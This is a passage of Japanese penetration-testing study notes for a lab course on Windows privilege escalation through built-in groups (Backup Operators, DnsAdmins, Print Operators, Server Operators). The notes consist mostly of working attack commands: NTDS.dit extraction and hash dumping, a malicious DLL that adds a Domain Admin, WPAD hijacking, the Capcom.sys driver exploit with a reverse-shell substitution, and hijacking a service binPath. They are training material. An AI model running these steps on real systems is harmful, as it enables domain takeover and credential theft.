	- Active DirectoryデータベースであるNTDS.ditは、ドメイン内の全ユーザーおよびコンピューターオブジェクトのNTLMハッシュが含まれているため、非常に魅力的なターゲットできる
	- このファイルはロックされており、権限を持たないユーザーはアクセスできない
- NTDS.ditファイルはデフォルトでロックされているため、Windowsの diskshadow ユーティリティを使用してCドライブのシャドウコピーを作成し、それをEドライブとして公開することができる
	- シャドウコピー内のNTDS.ditはシステムによって使用されていない状態になるのでロックされない
```powershell-session
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

E:をのぞいてみる
```powershell-session
PS C:\htb> dir E:
    Directory: E:\
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

次に、Copy-FileSeBackupPrivilege コマンドレットを使用してACLをバイパスし、NTDS.ditをローカルにコピーする
```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

SAMおよびSYSTEMレジストリハイブのバックアップ
- SAMおよびSYSTEMレジストリハイブをバックアップする
	- ただし、フォルダまたはファイルに現在のユーザーまたは所属するグループに対する明示的な「拒否」のエントリがある場合、FILE_FLAG_BACKUP_SEMANTICS フラグを指定してもアクセスできないことに注意が必要
```cmd-session
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
C:\htb> reg save HKLM\SAM SAM.SAV
```

**NTDS.ditからの認証情報の抽出**
- 抽出したNTDS.ditを使用して、secretsdump.pyのようなツールやPowerShellのDSInternalsモジュールを使用して、Active Directoryのすべてのアカウントの認証情報を抽出できる
- 以下のコマンドでは、DSInternalsを使用してドメインのadministratorアカウントのNTLMハッシュのみを取得する
```powershell-session
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
<SNIP>
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
<SNIP>
```

SecretsDumpを使用したハッシュの抽出
- ntds.ditファイルからSecretsDumpをオフラインで使用してハッシュを抽出することもできる
	- パス・ザ・ハッシュ攻撃に利用
	- Hashcatなどを使用してオフラインでクラック
	- ペネトレでクラックできたら
		- パスワードクラック統計をクライアントに提示し、ドメイン全体のパスワード強度と使用状況に関する詳細な洞察を提供し、パスワードポリシーの改善（最小長さの増加、許可されない単語の辞書作成など）に関する推奨事項を提供することもできる
```shell-session
snowyowl644@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

#### Robocopy
- robocopyも、バックアップモードでファイルをコピーするために使用できる
- Robocopyはコマンドラインのディレクトリ複製ツール
- バックアップジョブの作成に使用でき、マルチスレッドコピー、自動再試行、コピーの中断からの再開などの機能を含んでいる
- Robocopyは、単にすべてのファイルをコピーするcopyコマンドとは異なり、コピー先のディレクトリをチェックして、コピー元のディレクトリに存在しなくなったファイルを削除できる
- コピーする前にファイルを比較して、最後のコピー/バックアップジョブ以降に変更されていないファイルをコピーしないことで時間を節約することも可能
```cmd-session
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

## Event Log Readers
この権限は、**管理者権限がなくても**、Windowsのイベントログ（セキュリティログを除く）を読み取ることができる
- Event Log Readersグループのメンバーは、この記録されたパスワードを見ることができてしまう可能性がある
	- セキュリティログ自体は管理者権限が必要な場合もあるが、他のログにパスワードが記録される可能性もあるため注意が必要

この権限の正しい使い道
- 組織は、防御者が潜在的な悪意のある挙動を監視・特定し、システムに存在すべきでないバイナリを識別できるよう、プロセスコマンドラインのログ記録を有効にすることがある
	- このデータは、防御者がネットワーク内のシステムでどのようなバイナリが実行されているかの可視性を得るために、SIEMツールに出力されたり、ElasticSearchのような検索ツールに取り込まれることがある

グループメンバーシップの確認
- 以下のような出力だったら、Event Log Readersの権限を持っている
```cmd-session
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

### wevtutilを使用したセキュリティログの検索
- コマンドラインから wevtutil ユーティリティおよび Get-WinEvent PowerShellコマンドレットを使用してWindowsイベントをクエリできる
- 多くのWindowsコマンドはパスワードをパラメータとして渡すことをサポートしているため、認証情報を取得できる時もある

Windows の「セキュリティイベントログ」から情報を抽出し、その中から特定の文字列 /user を含む行をフィルタリングする
```powershell-session
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

|   |   |
|---|---|
|wevtutil|Windows イベントログの管理ツール（コマンドライン）|
|qe Security|「Security」ログをクエリ（query events）|
|/rd:true|イベントを**新しい順**に表示（reverse direction）|
|/f:text|出力形式を**テキスト形式**にする|
|`|Select-String “/user”`|

**wevtutilに認証情報を渡す**
- wevtutil の場合、/u および /p パラメータを使用して代替認証情報を指定することもできる
```cmd-session
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

### Get-WinEventを使用したセキュリティログの検索
- プロセスコマンドラインに/userが含まれるプロセス作成イベント（4688）をフィルタリングしている
```powershell-session
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```
- Get-WinEvent でセキュリティイベントログを検索するには、管理者権限が必要
- レジストリキー `HKLM\System\CurrentControlSet\Services\Eventlog\Security` の権限を調整する必要がある
- Event Log Readersグループのメンバーシップだけでは不十分


## DNSAdmins
Windowsの組み込みグループ DnsAdminsについて
- DnsAdminsグループのメンバーは、DNSサーバーの設定を変更する権限を持つ
	- DNSサービス自体は「NT AUTHORITY\SYSTEM」という、Windowsで一番強い権限で動いていることが多い
	- Windows DNSサービスはカスタムプラグインをサポートしており、ローカルでホストされているどのDNSゾーンの範囲外にある名前解決クエリに対して、それらのプラグインの関数を呼び出す
	- DNSはドメインコントローラー上で実行されている場合が多い

**権限の確認**
```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109    
```

### DLLローディング
- DNSサービスに悪意のあるプログラムを動かさせる 
	- DnsAdminsメンバーは、DNSサービスが起動するときに読み込む「DLL」というプログラムを指定できる
	- 組み込みの dnscmd ユーティリティを使用して、プラグインDLLのパスを指定することが可能
	- 攻撃者は自分が作った悪意のあるDLLを指定する
	- DNSサービスが再起動されると、その悪意のあるDLLが**SYSTEM権限で実行されてしまう！**
	- これにより、簡単にドメイン管理者権限を奪取したり、自由にコマンドを実行したりできる
**流れ**
- DNS管理はRPC経由で行われる。
- ServerLevelPluginDll を使用すると、DLLのパスの検証なしにカスタムDLLをロードできる。これはコマンドラインから dnscmd ツールを使用して実行できる。
- DnsAdminsグループのメンバーが以下の dnscmd コマンドを実行すると、`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` レジストリキーが設定される。
- DNSサービスが再起動されると、このパス（ドメインコントローラーのマシンアカウントがアクセスできるネットワーク共有など）にあるDLLがロードされる。
- 攻撃者はカスタムDLLをロードしてリバースシェルを取得したり、MimikatzのようなツールをDLLとしてロードして認証情報をダンプしたりすることができる。

悪意のあるDLLの作成
- msfvenom を使用して、ドメイン管理者グループにユーザーを追加する悪意のあるDLLを生成できる
	- また、Mimilib.dllも使用することができる
```shell-session
snowyowl644@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

ローカルHTTPサーバーの起動
```shell-session
snowyowl644@htb[/htb]$ python3 -m http.server 7777
```

ターゲットへ作成したDLLをダウンロード
```powershell-session
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

非特権ユーザーとしてのDLLローディング
- 非特権ユーザーとして dnscmd ユーティリティを使用してカスタムDLLをロードしようとするとどうなるか見てみるけど、アクセスは許可されない
```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

DnsAdminの権限を持っているかの確認
```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109    
```

**DnsAdminsメンバーとしてのDLLローディング**
- カスタムDLLへのフルパスを指定する必要ある
- DnsAdminsグループのメンバーは、レジストリキーに対する直接の権限は持っていませんが、dnscmd ユーティリティのみを使用できる
```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

DNSが再起動する必要がある
- 悪意のあるプラグインのパスを含むレジストリ設定が構成され、ペイロードが作成されたら、DNSサービスが次に開始されるときにDLLがロードされる
- DnsAdminsグループのメンバーシップはDNSサービスを再起動する権限を与えませんが、システム管理者がDNS管理者に許可することは考えられる
- DNSサービスを再起動した後（もし私たちのユーザーがこのレベルのアクセス権を持っている場合）、カスタムDLLを実行してユーザーを追加（このケースの場合）するか、カスタムDLLが接続を返すように作られていればリバースシェルを取得できるはず

DNSを再起動する権限を持っているかの確認
- ユーザーのSIDを取得して、sc コマンドを使用してサービスに対する権限を確認する
```cmd-session
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

```cmd-session
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
- この[記事](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)によると、私たちのユーザーはRPWP権限を持っており、これはそれぞれ `SERVICE_START` および `SERVICE_STOP` に相当する
	- どういうこと？
		- **サービスオブジェクトに対するアクセス制御エントリ（ACE）** の一部で、具体的には「RP（ReadProperty）」および「WP（WriteProperty）」という2つの権限を組み合わせて「RPWP」と呼んでいる
	- なぜ RPWP でサービスの開始や停止が可能？
		- これはちょっと裏技的な話で、Windowsの サービスオブジェクトのDACL（アクセス制御リスト）で、サービスのStart/Stop権限は通常以下のようなアクセス権で定義されている
		- StartService() : SERVICE_START
		- ControlService()（停止など） : SERVICE_STOP
		- なので、サービスの「構成プロパティ」（たとえば Start モード）に書き込み（WP）したり、状態を読み取ったり（RP）することで、間接的にサービスの動作を操作できてしまうケースがあるから

DNSを停止、開始させて、DLLを読み込ませる
```cmd-session
C:\htb> sc.exe stop dns
C:\htb> sc.exe start dns
```

グループメンバーシップの確認
- 私たちのアカウントはDomain Adminsグループに追加されるか、カスタムDLLが接続を返すように作られていればリバースシェルを受信するはず
```cmd-session
C:\htb> net group "Domain Admins" /dom
Group name     Domain Admins
Comment        Designated administrators of the domain
Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

> グループ権限は **ログオン時にトークンとして生成**されるため、**新しい権限はログインし直すまで反映されない**。
### WPAD悪用
- **ネットワーク通信を乗っ取る**
- DnsAdminsメンバーは、特定の危険な名前（WPADなど）の名前解決をブロックする`Global Query Block`セキュリティを無効にする権限を持ってる
- デフォルトでは、`Web Proxy Automatic Discovery Protocol (WPAD)` および `Intra-site Automatic Tunnel Addressing Protocol (ISATAP)` がグローバルクエリブロックリストに含まれている
- これらのプロトコルはハイジャックに対して非常に脆弱であり、任意のドメインユーザーがこれらの名前を含むコンピューターオブジェクトまたはDNSレコードを作成できる
- グローバルクエリブロックリストを無効にし、WPADレコードを作成した後、WPADという名前を攻撃者のマシンに向けるように設定する
	- WPADを使っている他のコンピューターは、攻撃者のマシンをプロキシ（中継地点）として使ってしまう
- 攻撃者は、ResponderやInveighのようなツールを使用してトラフィックスプーフィングを実行し、パスワードハッシュを取得してオフラインでクラックしたり、SMBRelay攻撃を実行したりすることができる

Global Query Block Listの無効化
- この攻撃を設定するために、まずグローバルクエリブロックリストを無効にする
```powershell-session
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

WPADレコードの追加
- 次に、私たちの攻撃マシンを指すWPADレコードを追加する
```powershell-session
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```


## Hyper-V Administrators
- Hyper-V Administratorsグループは、Hyper-Vという仮想マシンを管理するシステムに対して非常に強い権限を持つグループ
	- このグループのメンバーは、仮想マシンの作成、変更、削除などが自由にできる
- ドメインコントローラー(DC)が仮想マシンとして動いている環境では、このグループが非常に危険
	- 攻撃者はDCの仮想マシンファイル（ハードディスクファイルなど）をコピーしたり操作したりできる
	- 仮想マシンファイルの中には、ドメイン全体のユーザー名やパスワード情報（ハッシュ化されたもの）が入ったファイル（NTDS.dit）が含まれていることが多い
	- そのファイルをオフラインで解析することで、全ユーザーのパスワード情報を入手できる可能性がある
- 過去には、仮想マシンの削除処理の仕組みとWindowsの特定の機能（ハードリンク）を組み合わせることで、Hyper-V Administrators権限からWindowsで最も強い権限であるSYSTEM権限を奪う攻撃手法が存在した
	- これにより、攻撃者はシステム上でほぼ何でもできてしまう状態になった
	- 例として、特定のサービス実行ファイル（この文章ではFirefoxのメンテナンスサービス）をターゲットに、そのファイルに対する権限を不正に奪い、悪意のあるプログラムに置き換えてSYSTEM権限で実行させる、といった手法があった
	- **ただし、この特に危険だったハードリンクを利用した攻撃手法は、2020年3月のWindowsアップデートで対策済み**
- 現在でも、DCが仮想化されている環境では、Hyper-V Administratorsは実質的にドメイン管理者と同等のリスクを持つため、メンバーシップは厳重に管理する必要がある

## Print Operators
- Print Operatorsグループは、プリンター管理などの権限を持つグループ
	- ドメインコントローラーへのローカルログオンやシャットダウンなどもできる
	- **このグループが持つ特に危険な権限の一つに、「ドライバーのロードおよびアンロード権限 (SeLoadDriverPrivilege)」がある**
権限を持ってるかの確認
```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

SeLoadDriverPrivilege権限を持っているかの確認
```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

### ドライバーロード権限の悪用
- ドライバー Capcom.sys を使えば、任意のユーザーがSYSTEM権限でシェルコードを実行できる
- SeLoadDriverPrivilegeを利用して、この脆弱なドライバーをロードし、権限を昇格させることができる
このPoCは、特権を有効化し、ドライバーをロードする機能も含んでいる
- 使い方 : Visual Studio 2019 Developer Command Promptから、cl.exe を使用してコンパイルする
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```
コンパイル
```Visual-Studio-2019-Developer-Command-Prompt
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

ドライバーへの参照の追加
- ここからCapcom.sys ドライバーをダウンロードし、C:\temp に保存する
	- https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
HKEY_CURRENT_USERツリーの下にこのドライバーへの参照を追加する
```cmd-session
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
- 悪意のあるドライバーの ImagePath を参照するために使用される奇妙な構文 `\??\` は、NTオブジェクトパス
	- Win32 APIはこのパスを解析・解決して、悪意のあるドライバーを適切に見つけ、ロードする

特権が有効化されていることの確認
- EnableSeLoadDriverPrivilege.exe バイナリを実行する
```cmd-session
C:\htb> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

Capcomドライバーがリストされていることの確認
- 次に、Capcomドライバーがリストされるようになったことを確認する
```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

ExploitCapcomツールを使用して権限昇格
- Capcom.sys を悪用するには、Visual Studioでコンパイルした後、ExploitCapcomツールを使用する
	- SYSTEM権限を持つシェルが起動する
```powershell-session
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

ターゲットにGUIアクセスがない場合
- コンパイルする前に ExploitCapcom.cpp のコードを修正する必要がある
- 292行目を編集し、"C:\\Windows\\system32\\cmd.exe" を、例えば msfvenom で作成したリバースシェルバイナリ（例: c:\ProgramData\revshell.exe）に置き換えることができる
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```
CommandLine 文字列は、以下のように変更される
`TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");`

#### 手順の自動化
- EopLoadDriverによる自動化
	- 特権の有効化、レジストリキーの作成、およびNTLoadDriverの実行によるドライバーロードプロセスを自動化できる
	- ExploitCapcom.exe を実行してSYSTEMシェルを起動するか、カスタムバイナリを実行する

```sh
wget https://github.com/crum7/exe_vault/raw/refs/heads/main/EoPLoadDriver.exe
wget https://github.com/Ant1sec-ops/Compiled-capcom-exploit/raw/refs/heads/main/Capcom.sys

```

```cmd-session
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```



```sh
wget https://github.com/Ant1sec-ops/Compiled-capcom-exploit/raw/refs/heads/main/ExploitCapcom.exe
```

```powershell-session
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```
- 現在のWindowsでは対策されている点
	- **Windows 10 バージョン1803以降、HKCU（現在のユーザー）のレジストリツリーからドライバーをロードする際に、ドライバーのパスを指定する方法に制限が加わった**
	- これにより、Print Operators権限（通常はHKCUに書き込める）でSeLoadDriverPrivilegeを悪用してSYSTEM権限を奪うことが難しくなった、あるいは不可能になった
- まとめ
	- Print Operatorsはプリンター管理以外にも SYSTEMシャットダウンやローカルログオンなど重要な権限を持つ。
	- 過去にはSeLoadDriverPrivilegeの悪用が大きなリスクだったが、OSのアップデートでその手法は緩和された。
	- とはいえ、Print Operatorsグループは依然として重要な権限を持つため、メンバーシップの管理は注意深く行うべき。

## Server Operators
- Server Operatorsグループは、ドメイン管理者権限なしでサーバー管理ができる権限を持つグループ
	- サーバーにローカルログオンしたり、サービスを制御したりできる高い権限を持つ
- このグループが危険な理由の一つは、「サービスの制御」権限
	- Windowsのサービスの中には、「SYSTEM」という非常に強い権限で動いているものがある
	- Server Operatorsは、**SYSTEM権限で動く特定のサービスの設定を変更できる**ことがある
	- メンバーシップは、強力な SeBackupPrivilege および SeRestorePrivilege 特権、およびローカルサービスを制御する能力が与えられる



### サービスのバイナリパス変更
まず、全サービスの状態を確認
```cmd
sc query type= service state= all
```

AppReadinessサービスの調査
- SYSTEM権限で開始されるかを調査する
	- `SERVICE_START_NAME` : LocalSystem は、このAppReadinessサービスが NT AUTHORITY\SYSTEM というSYSTEM権限で実行されることを示す
```cmd-session
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

PsServiceを使用したサービス権限の確認
- Sysinternalsスイートの一部であるサービスビューア/コントローラー PsService を使用して、サービスに対する権限を確認できる
	- Server Operatorsグループが SERVICE_ALL_ACCESS アクセス権（このサービスに対する完全な制御権を与える）を持っていることがわかる
```cmd-session
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com
<SNIP>
        [ALLOW] BUILTIN\Server Operators
                All.     <-- "All" は SERVICE_ALL_ACCESS に相当
```

ローカル管理者グループメンバーシップの確認
- 現在は、ローカル Administrators グループの現在のメンバーを確認し、私たちのターゲットアカウントが含まれていない
```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

サービスのバイナリパスの変更
- AppReadinessがSYSTEM権限で実行されることを利用し、サービスの実行ファイルパス (binPath) を変更して、現在のユーザーをデフォルトのローカルAdministratorsグループに追加するコマンドを実行させる
	- `sc config [サービス名] binPath= "[実行したいコマンド]" `という形式で、サービスが起動時に実行するプログラムを指定できる
	- ここでは、SYSTEM権限で「ローカルグループ Administrators にユーザー server_adm を追加する」コマンドを実行させている
```cmd-session
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

サービスの開始
- サービスの開始は失敗するけど、これは当たり前
- バックグラウンドでコマンドはSYSTEM権限で実行されている
```cmd-session
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

ローカル管理者グループメンバーシップの確認
- Administratorsグループのメンバーシップを確認すると、コマンドが正常に実行され、ユーザーが追加されていることがわかる
```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

ドメインコントローラーでのローカル管理者アクセスの確認
- これにより、私たちはドメインコントローラーに対する完全な制御権を獲得した
- crackmapexec のようなツールを使って、追加したアカウント (server_adm) でDCにローカル管理者としてログインできるか確認できる
```shell-session
snowyowl644@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

ドメインコントローラーからのNTLMパスワードハッシュの取得
- ローカル管理者権限があれば、secretsdump.py のようなツールを使用してNTDS.ditから認証情報を取得できる
```shell-session
snowyowl644@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```
- 攻撃者はServer Operators権限を使って、SYSTEM権限で動くサービスの「起動時に実行するプログラム」の設定を書き換える

> ログオフして、もう一回ログオンする必要がある
> 	HTBだと、windowsマークから、ログオフ→RDP再接続


# OSへの攻撃
## User Access Control
- UACは、Windowsで何か重要な設定変更やプログラム実行をするときに、「本当にやりますか？」と確認画面を出す機能
	- これにより、管理者が意図しない操作をしてシステムがおかしくなるのを防ぐ手助けをする（便利機能）
	- **完全にセキュリティを守る「境界」ではない**

UACの動作原理
- ログオンプロセス、ユーザーエクスペリエンス、UACアーキテクチャが含まれている
- 管理者は、セキュリティポリシーを使用して、組織固有のUACの動作をローカルレベルで（secpol.mscを使用して）、またはActive Directoryドメイン環境ではグループポリシーオブジェクト（GPO）経由で構成および展開できる
UACには設定できる10のグループポリシー設定

|**グループポリシーの設定**|**レジストリキー**|**デフォルト設定**|
